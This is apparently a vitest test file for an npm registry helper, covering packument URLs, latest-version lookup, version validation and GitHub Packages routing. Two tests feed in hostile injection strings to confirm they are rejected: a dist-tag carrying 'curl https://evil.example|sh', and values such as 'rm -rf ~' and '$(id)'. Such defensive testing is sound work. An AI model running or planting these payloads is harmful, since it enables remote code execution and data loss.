import type { execaSync } from 'execa'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { npm_registry } from './npm-registry'

const execa_outcomes = vi.hoisted(() => vi.fn())

vi.mock('execa', () => ({ execaSync: execa_outcomes }))

type ExecaSyncResult = ReturnType<typeof execaSync>

const KIT_PACKAGE = '@joshuafolkken/kit'
const KIT_URL = 'https://registry.npmjs.org/@joshuafolkken%2fkit'
// A scope routed to GitHub Packages. Its own name, because the scope's registry is memoized.
const GITHUB_PACKAGE = '@github-routed/kit'
const GITHUB_REGISTRY = 'https://npm.pkg.github.com/'
const LATEST = '1.1035.0'
const PUBLISHED_AT = '2026-10-02T12:48:29.697Z'
const ABBREVIATED_ACCEPT = 'application/vnd.npm.install-v1+json'
const FULL_ACCEPT = 'application/json'
const LATEST_BODY = JSON.stringify({ 'dist-tags': { latest: LATEST } })

function fake_result(stdout: string, exit_code = 0): ExecaSyncResult {
	return { stdout, exitCode: exit_code } as unknown as ExecaSyncResult
}

// `pnpm config get <scope>:registry` answers the scope's registry; every other spawn is the
// packument request, answered with `packument`.
function respond_with(packument: ExecaSyncResult): void {
	execa_outcomes.mockImplementation((command: string, arguments_: ReadonlyArray<string>) => {
		if (command !== 'pnpm') return packument
		const is_github = arguments_.at(-1)?.startsWith('@github-routed') === true

		return fake_result(is_github ? GITHUB_REGISTRY : 'undefined')
	})
}

function packument_requests(): ReadonlyArray<ReadonlyArray<string>> {
	const calls = execa_outcomes.mock.calls as Array<[string, ReadonlyArray<string>]>

	return calls.filter(([command]) => command === process.execPath).map(([, argv]) => argv)
}

beforeEach(() => {
	vi.clearAllMocks()
})

describe('npm_registry.packument_url', () => {
	it('encodes the scope separator of a scoped package', () => {
		expect(npm_registry.packument_url(KIT_PACKAGE)).toBe(KIT_URL)
	})

	it('leaves an unscoped package name as is', () => {
		expect(npm_registry.packument_url('execa')).toBe('https://registry.npmjs.org/execa')
	})
})

describe('npm_registry.read_latest', () => {
	it('returns the latest dist-tag', () => {
		respond_with(fake_result(LATEST_BODY))

		expect(npm_registry.read_latest(KIT_PACKAGE)).toBe(LATEST)
	})

	it('requests the abbreviated packument from public npm through the running Node', () => {
		respond_with(fake_result(LATEST_BODY))
		npm_registry.read_latest(KIT_PACKAGE)

		expect(packument_requests()[0]?.slice(-2)).toStrictEqual([KIT_URL, ABBREVIATED_ACCEPT])
	})

	it('returns nothing when the request fails', () => {
		respond_with(fake_result('', 1))

		expect(npm_registry.read_latest(KIT_PACKAGE)).toBeUndefined()
	})

	it('returns nothing when the body is not a packument', () => {
		respond_with(fake_result('not json'))

		expect(npm_registry.read_latest(KIT_PACKAGE)).toBeUndefined()
	})

	it('refuses a latest dist-tag carrying shell metacharacters', () => {
		const tampered = JSON.stringify({
			'dist-tags': { latest: '1.0.0;curl https://evil.example|sh' },
		})

		respond_with(fake_result(tampered))

		expect(npm_registry.read_latest(KIT_PACKAGE)).toBeUndefined()
	})
})

describe('npm_registry.valid_version', () => {
	it('keeps an exact semver version, prerelease included', () => {
		const prerelease = '1.2.3-beta.1'

		expect(npm_registry.valid_version(prerelease)).toBe(prerelease)
	})

	it.each(['v1.2.3', ' 1.2.3', '1.2.3 && rm -rf ~', '$(id)', ''])('refuses %j', (value) => {
		expect(npm_registry.valid_version(value)).toBeUndefined()
	})
})

// A consumer routed to GitHub Packages keeps reading it: the two registries are published by
// parallel jobs, so public npm could name a release that consumer's registry does not carry yet.
describe('npm_registry — a scope routed to GitHub Packages', () => {
	it('answers nothing for the latest without requesting public npm', () => {
		respond_with(fake_result(LATEST_BODY))

		expect(npm_registry.read_latest(GITHUB_PACKAGE)).toBeUndefined()
		expect(packument_requests()).toHaveLength(0)
	})

	it('answers nothing for the publish times without requesting public npm', () => {
		respond_with(fake_result(JSON.stringify({ time: {} })))

		expect(npm_registry.read_release_times(GITHUB_PACKAGE)).toBeUndefined()
		expect(packument_requests()).toHaveLength(0)
	})
})

describe('npm_registry.read_release_times', () => {
	it('returns the time map', () => {
		const time = { created: PUBLISHED_AT, [LATEST]: PUBLISHED_AT }

		respond_with(fake_result(JSON.stringify({ time })))

		expect(npm_registry.read_release_times(KIT_PACKAGE)).toStrictEqual(time)
	})

	// The abbreviated packument has no `time`, so only the full one can answer.
	it('requests the full packument', () => {
		respond_with(fake_result(JSON.stringify({ time: {} })))
		npm_registry.read_release_times(KIT_PACKAGE)

		expect(packument_requests()[0]?.at(-1)).toBe(FULL_ACCEPT)
	})

	it('returns nothing when the packument carries no time map', () => {
		respond_with(fake_result(JSON.stringify({ name: KIT_PACKAGE })))

		expect(npm_registry.read_release_times(KIT_PACKAGE)).toBeUndefined()
	})
})

describe('npm_registry.has_public_version', () => {
	const PUBLISHED_TIMES = JSON.stringify({ time: { [LATEST]: PUBLISHED_AT } })

	it('answers whether public npm carries the version', () => {
		respond_with(fake_result(PUBLISHED_TIMES))

		expect(npm_registry.has_public_version(KIT_PACKAGE, LATEST)).toBe(true)
		expect(npm_registry.has_public_version(KIT_PACKAGE, '9.9.9')).toBe(false)
	})

	// `josh release` links npmjs.com, so a scope this checkout installs from GitHub Packages is
	// still asked of public npm.
	it('asks public npm even for a scope routed to GitHub Packages', () => {
		respond_with(fake_result(PUBLISHED_TIMES))

		expect(npm_registry.has_public_version(GITHUB_PACKAGE, LATEST)).toBe(true)
		expect(packument_requests()).toHaveLength(1)
	})

	it('answers no when the registry cannot be reached', () => {
		respond_with(fake_result('', 1))

		expect(npm_registry.has_public_version(KIT_PACKAGE, LATEST)).toBe(false)
	})
})
